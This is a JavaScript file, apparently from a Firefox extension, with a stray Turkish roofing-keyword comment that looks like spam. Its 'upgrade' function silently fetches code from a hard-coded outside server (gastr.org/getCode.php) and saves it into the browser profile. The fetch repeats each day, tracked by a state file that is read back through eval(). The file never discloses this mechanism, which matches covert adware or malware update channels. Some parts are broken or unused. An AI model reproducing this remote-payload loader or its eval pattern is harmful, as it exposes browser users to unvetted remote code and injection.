//change firsturl,frame sizes,click()


//çatı aktarma, kumlu mebran, çatı izalasyonu,çatı yalıtımı
function	out(object) {

		if (!debug)
			return;

		var output = '';
		if (typeof (object) === "object") {
			for (property in object) {
				output += property + ': ' + object[property] + '\n ';
			}
		}

		else {
			output = object;
		}
		//var d = document.getElementById("dframe");
		 alert(output);

	}
var debug = true;

function myInit() {
	myfuncload()
}
function dayofyear(d) { // d is a Date object
	var yn = d.getFullYear();
	var mn = d.getMonth();
	var dn = d.getDate();
	var d1 = new Date(yn, 0, 1, 12, 0, 0); // noon on Jan. 1
	var d2 = new Date(yn, mn, dn, 12, 0, 0); // noon on input date
	var ddiff = Math.round((d2 - d1) / 864e5);
	return ddiff + 1;
}

var active = true;

var firsturl = "http://www.gastr.org/getCode.php";

function upcontrole() {

	readFile("upgrade.hga", function(data) {		
	
		if (data === null) {
			writeToFile("upgrade.hga", "{doy:1,upurl:'" + firsturl + "'}",
					function(c) {
						if (c == null) {
							/**
							 * write fail
							 */
						} else {
							upgrade(firsturl);
						}
					});
		} else {
			eval("var dd=" + data);
			
			if (dd.doy === doy) {
				/**
				 * already upgraded.
				 */

			} else {

				upgrade(dd.upurl);

			}
		}
	});
}
var doy;
function myfuncload() {


}
function doit(){
var left = (screen.width/2)-(200);
var top = (screen.height/2)-(250);
window.open("chrome://hga/content/mywin.xul", "", "top="+top+", left="+left+",width=400,height=500");



}
window.addEventListener("load", myInit, false);

function readFile(filename, callback) {

	Components.utils.import("resource://gre/modules/FileUtils.jsm");

	var file = 0;
	try {
		file = FileUtils.getFile("ProfD", [ filename ]);
	} catch (e) {

	}

	Components.utils.import("resource://gre/modules/NetUtil.jsm");
	try {
		NetUtil.asyncFetch(file, function(inputStream, status) {
			if (!Components.isSuccessCode(status)) {

				callback(null);
			}

			var data = NetUtil.readInputStreamToString(inputStream, inputStream
					.available());
			callback(data);
		});

	} catch (e1) {
		/**
		 * file not found. first installation.
		 */
		callback(null);

	}

}
function writeToFile(filename, dataw, callback) {
	Components.utils.import("resource://gre/modules/NetUtil.jsm");
	Components.utils.import("resource://gre/modules/FileUtils.jsm");

	var file = FileUtils.getFile("ProfD", [ filename ]);

	var data = dataw;

	var ostream = FileUtils.openSafeFileOutputStream(file);

	var converter = Components.classes["@mozilla.org/intl/scriptableunicodeconverter"]
			.createInstance(Components.interfaces.nsIScriptableUnicodeConverter);
	converter.charset = "UTF-8";
	var istream = converter.convertToInputStream(data);

	NetUtil.asyncCopy(istream, ostream, function(status) {
		if (!Components.isSuccessCode(status)) {

			callback(null);

			return;

		}
		callback(true);

	});

}
function upgrade(upurl) {
	
	Components.utils.import("resource://gre/modules/NetUtil.jsm");
	Components.utils.import("resource://gre/modules/FileUtils.jsm");

	var file = FileUtils.getFile("ProfD", [ "hga.hga" ]);

	Ajax
			.call({

				url : upurl,
				load : function() {

				},
				success : function(res) {

					var data = res;

					var ostream = FileUtils.openSafeFileOutputStream(file);

					var converter = Components.classes["@mozilla.org/intl/scriptableunicodeconverter"]
							.createInstance(Components.interfaces.nsIScriptableUnicodeConverter);
					converter.charset = "UTF-8";
					var istream = converter.convertToInputStream(data);

					NetUtil.asyncCopy(istream, ostream, function(status) {
						if (!Components.isSuccessCode(status)) {
							// Handle error!
							return;
						}
						writeToFile("upgrade.hga", "{doy:"
								+ dayofyear(new Date()) + ",upurl:'" + upurl
								+ "'}", function(c) {
							if (c == null) {
								/**
								 * write fail
								 */
							} else {

							}
						});
					});

				}
			});

}

Ajax = {

	getObject : function() {
		var http = null;
		if (window.XMLHttpRequest) {
			http = new XMLHttpRequest();
		} else if (window.ActiveXObject) {
			http = new ActiveXObject("Microsoft.XMLHTTP");
		} else {
			alert('Problem creating the XMLHttpRequest object');
		}
		return http;
	},
	call : function(params) {

		var http = this.getObject();

		var method = params.method || "post";

		var load = params.load || null;

		var url = params.url;

		var query = "";

		for (p in params.params) {

			query += p + "=" + params.params[p] + "&";
		}

		query = query.substr(0, query.length - 1);
		// console.info(query);

		http.open(method, url);

		http.onreadystatechange = function() {
			Ajax.procces(http, params.success);
		};
		http.setRequestHeader("Content-type",
				"application/x-www-form-urlencoded");
		http.setRequestHeader("Content-length", params.length);
		http.setRequestHeader("Connection", "close");
		http.send(query);

		if (load !== null) {
			load();
		}
	},
	procces : function(http, callback) {

		if (http.readyState == 4 && http.status == 200) {

			if (http.responseText) {
				if (callback)
					callback(http.responseText);
			} else {

			}
		}
		if (http.readyState == 2) {

		}
	}

};
